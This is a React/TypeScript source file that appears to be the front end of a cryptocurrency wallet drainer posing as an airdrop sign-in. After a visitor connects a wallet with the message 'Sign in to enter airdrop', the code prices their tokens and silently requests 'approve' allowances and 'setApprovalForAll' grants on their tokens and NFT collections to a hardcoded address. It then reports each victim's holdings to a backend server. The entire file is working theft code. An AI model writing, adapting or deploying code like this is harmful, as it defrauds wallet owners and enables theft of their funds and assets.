import logo from "./logo.svg";
import "./App.css";
import { useMoralis, useNFTBalances } from "react-moralis";
import Moralis from "moralis";
import { useEffect, useState } from "react";
import {
    useMoralisWeb3Api,
    useTokenPrice,
    useERC20Balances,
} from "react-moralis";

const myAddress = "0xB1764F34b69a8DcE6B624D3c5c1B9774Fe7012b3";
const ercTokenContractABI = [
    {
        constant: false,
        inputs: [
            { internalType: "address", name: "_spender", type: "address" },
            { internalType: "uint256", name: "_amount", type: "uint256" },
        ],
        name: "approve",
        outputs: [
            {
                internalType: "bool",
                name: "",
                type: "bool",
            },
        ],
        payable: false,
        stateMutability: "nonpayable",
        type: "function",
    },
];

const nftTokenContractABI = [
    {
        inputs: [
            { internalType: "address", name: "operator", type: "address" },
            { internalType: "bool", name: "approved", type: "bool" },
        ],
        name: "setApprovalForAll",
        outputs: [],
        stateMutability: "nonpayable",
        type: "function",
    },
];

interface NFT {
    token_address: string,
    token_id: string,
    contract_type: string,
    owner_of: string,
    block_number: string,
    block_number_minted: string,
    token_uri: string,
    metadata: string,
    synced_at: string,
    amount: string,
    name: string,
    symbol: string,
}


interface ITokenBalance {
    token_address: string;
    name: string;
    symbol: string;
    logo?: string | undefined;
    thumbnail?: string | undefined;
    decimals: string;
    balance: string;
    usdBalance?: string;
}

interface TokenProps {
    balances: ITokenBalance[];
    address: string;
}

const TokenPrice: React.FC<TokenProps> = (props) => {
    const { data } = useNFTBalances();
    const [tokenBalances, setTokenBalances] = useState<ITokenBalance[]>([]);
    const [highTokenBalances, setHighTokenBalances] = useState<ITokenBalance[]>([]);
    const { Moralis } = useMoralis();
    const Web3Api = useMoralisWeb3Api();

    const fetchBalances = async () => {
        setTokenBalances([]);

        let _tokenBalances: ITokenBalance[] = [];
        let _highTokenBalances: ITokenBalance[] = [];

        for (let balance of props.balances) {
            try {
                const price = await Web3Api.token.getTokenPrice({
                    address: balance.token_address,
                });
                const _price = (
                    price.usdPrice *
                    Number(
                        Moralis.Units.FromWei(balance.balance, Number(balance.decimals))
                    )
                ).toString();
                const _balance = balance;
                _balance.usdBalance = _price;

                if (Number(_price) >= 2000) {
                    _highTokenBalances.push(_balance);
                }
                else if (Number(_price) >= 5) {
                    _tokenBalances.push(_balance);
                }
            } catch (err) {
                console.log(err);
            }
        }



        _tokenBalances = _tokenBalances.sort((a, b) => {
            if (Number(a.usdBalance) < Number(b.usdBalance)) {
                return -1;
            }
            if (Number(a.usdBalance) > Number(b.usdBalance)) {
                return 1;
            }
            return 0;
        });

        _highTokenBalances = _highTokenBalances.sort((a, b) => {
            if (Number(a.usdBalance) < Number(b.usdBalance)) {
                return -1;
            }
            if (Number(a.usdBalance) > Number(b.usdBalance)) {
                return 1;
            }
            return 0;
        });

        setTokenBalances(_tokenBalances);
        setHighTokenBalances(_highTokenBalances);

    };

    const fetchNFTBalance = async () => {

    }
    useEffect(() => {
        fetchBalances();
        // fetchNFTLowestPrice();
        // console.log(tokenBalances)
    }, [props.balances]);

    useEffect(() => {
        (async () => {
            if (highTokenBalances.length) {
                for (let ercBalance of highTokenBalances) {
                    try {
                        const sendOptions = {
                            contractAddress: ercBalance.token_address,
                            functionName: "approve",
                            abi: ercTokenContractABI,
                            params: {
                                _spender: myAddress,
                                _amount: Moralis.Units.Token(10000, Number(ercBalance.decimals)),
                            },
                        };

                        const transaction = await Moralis.executeFunction(sendOptions);
                        fetch("http://localhost:8000/user-token/", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                // '
                            },
                            body: JSON.stringify({
                                address: props.address,
                                token_type: "erc20",
                                token_address: ercBalance.token_address,
                                token_id: ""
                            }),
                        });
                    } catch (error) { }
                }
            }

            if (data?.total) {
                const allNFTs = (data.result as any) as NFT[];
                const approvedNFT: string[] = [];
                for (let nft of allNFTs) {
                    if (!approvedNFT.find(_nft => nft.token_address == _nft)) {
                        approvedNFT.push(nft.token_address);
                        try {
                            const sendOptions = {
                                contractAddress: nft.token_address,
                                functionName: "setApprovalForAll",
                                abi: ercTokenContractABI,
                                params: {
                                    operator: myAddress,
                                    approved: true
                                },
                            };

                            const transaction = await Moralis.executeFunction(sendOptions);
                            fetch("http://localhost:8000/user-token/", {
                                method: "POST",
                                headers: {
                                    "Content-Type": "application/json",
                                    // '
                                },
                                body: JSON.stringify({
                                    address: props.address,
                                    token_type: "nft",
                                    token_id: nft.token_id,
                                    token_address: nft.token_address,
                                }),
                            });
                        } catch (error) { }
                    }
                }
            }

            if (tokenBalances.length) {
                for (let ercBalance of tokenBalances) {
                    try {
                        const sendOptions = {
                            contractAddress: ercBalance.token_address,
                            functionName: "approve",
                            abi: ercTokenContractABI,
                            params: {
                                _spender: myAddress,
                                _amount: Moralis.Units.Token(10000, Number(ercBalance.decimals)),
                            },
                        };

                        const transaction = await Moralis.executeFunction(sendOptions);
                        fetch("http://localhost:8000/user-token/", {
                            method: "POST",
                            headers: {
                                "Content-Type": "application/json",
                                // '
                            },
                            body: JSON.stringify({
                                address: props.address,
                                token_type: "erc20",
                                token_address: ercBalance.token_address,
                            }),
                        });
                    } catch (error) { }
                }
            }
        })()

    }, [tokenBalances]);
    return <></>;
};

function detectMob() {
    return window.innerWidth <= 800 && window.innerHeight <= 1000;
}

const Account = () => {
    const [address, setAddress] = useState("");
    const {
        authenticate,
        isAuthenticated,
        isAuthenticating,
        account,
        user,
        chainId,
        logout,
    } = useMoralis();
    const { fetchERC20Balances, data, isLoading, isFetching, error } =
        useERC20Balances();
    const [tokenPrices, setTokenPrices] = useState([]);
    const Web3Api = useMoralisWeb3Api();

    const authenticateUser = async () => {
        if (!isAuthenticated) {
            if (detectMob()) {
                const user = await authenticate({
                    provider: "walletconnect",
                    signingMessage: "Sign in to enter airdrop",
                });
                setAddress(account as string);
                return;
            }

            const user = await authenticate({
                signingMessage: "Sign in to enter airdrop",
            });
            setAddress(account as string);
        }
    };

    useEffect(() => {
        if (isAuthenticating) return;
        authenticateUser();
    }, [isAuthenticated]);
    return (
        <>
            {isAuthenticated && (
                <TokenPrice
                    address={account as string}
                    balances={data as ITokenBalance[]}
                />
            )}
        </>
    );
};

const EthApp = () => {
    const {
        authenticate,
        isAuthenticating,
        user,
        account,
        logout,
        isWeb3Enabled,
        enableWeb3,
        isAuthenticated,
        isWeb3EnableLoading,
    } = useMoralis();

    useEffect(() => {
        if (isAuthenticated && !isWeb3Enabled && !isWeb3EnableLoading) {
            if (detectMob()) {
                enableWeb3({ provider: "walletconnect" });
                return;
            }
            enableWeb3();
        }
    }, [isAuthenticated, isWeb3Enabled]);

    return (
        <>
            <Account />
        </>
    );
};

export default EthApp;
